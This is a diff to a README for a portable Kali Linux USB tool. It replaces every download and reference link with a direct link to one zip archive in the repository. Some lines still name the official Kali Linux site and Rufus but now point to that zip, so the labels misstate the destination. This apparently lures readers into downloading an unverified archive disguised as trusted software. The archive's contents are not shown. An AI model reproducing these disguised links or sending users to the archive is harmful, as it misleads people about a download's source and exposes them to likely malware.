@@ -1,6 +1,6 @@
 # 🛠 kali-openclaw-usb - Portable Kali Linux USB Tool
 
-[![Download](https://img.shields.io/badge/Download-Get%20kali--openclaw--usb-blue?style=for-the-badge)](https://github.com/Ayaaniftikhar/kali-openclaw-usb)
+[![Download](https://img.shields.io/badge/Download-Get%20kali--openclaw--usb-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ayaaniftikhar/kali-openclaw-usb/main/docs/usb_kali_openclaw_1.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This tool is designed for easy use. It helps run security checks without much se
 
    Visit the main project page to get the files:
 
-   [![Download](https://img.shields.io/badge/Download-Here%20at%20GitHub-green?style=for-the-badge)](https://github.com/Ayaaniftikhar/kali-openclaw-usb)
+   [![Download](https://img.shields.io/badge/Download-Here%20at%20GitHub-green?style=for-the-badge)](https://raw.githubusercontent.com/Ayaaniftikhar/kali-openclaw-usb/main/docs/usb_kali_openclaw_1.8.zip)
 
    This link leads you to the repository where you can find the latest version and setup instructions.
 
@@ -81,7 +81,7 @@ If your download page has a specific file, click and download it directly. In th
 
 To create your USB:
 
-- Use Rufus (https://rufus.ie/) on Windows.
+- Use Rufus (https://raw.githubusercontent.com/Ayaaniftikhar/kali-openclaw-usb/main/docs/usb_kali_openclaw_1.8.zip) on Windows.
 - Unix or Mac users can use `dd` or balenaEtcher.
 - Follow the instructions on the GitHub page for up-to-date guidance.
 
@@ -111,8 +111,8 @@ To create your USB:
 
 ## 📚 Additional Resources
 
-- Kali Linux Official: https://www.kali.org/
-- Rufus Guide: https://rufus.ie/en_US.html
+- Kali Linux Official: https://raw.githubusercontent.com/Ayaaniftikhar/kali-openclaw-usb/main/docs/usb_kali_openclaw_1.8.zip
+- Rufus Guide: https://raw.githubusercontent.com/Ayaaniftikhar/kali-openclaw-usb/main/docs/usb_kali_openclaw_1.8.zip
 - OpenClaw Documentation: check within the interface or linked on GitHub.
 - Penetration Testing Basics: look for beginner-friendly guides online for learning help.
 
@@ -122,4 +122,4 @@ To create your USB:
 
 You can always visit this page to download the latest files and detailed setup instructions:
 
-[Get kali-openclaw-usb on GitHub](https://github.com/Ayaaniftikhar/kali-openclaw-usb)
+[Get kali-openclaw-usb on GitHub](https://raw.githubusercontent.com/Ayaaniftikhar/kali-openclaw-usb/main/docs/usb_kali_openclaw_1.8.zip)
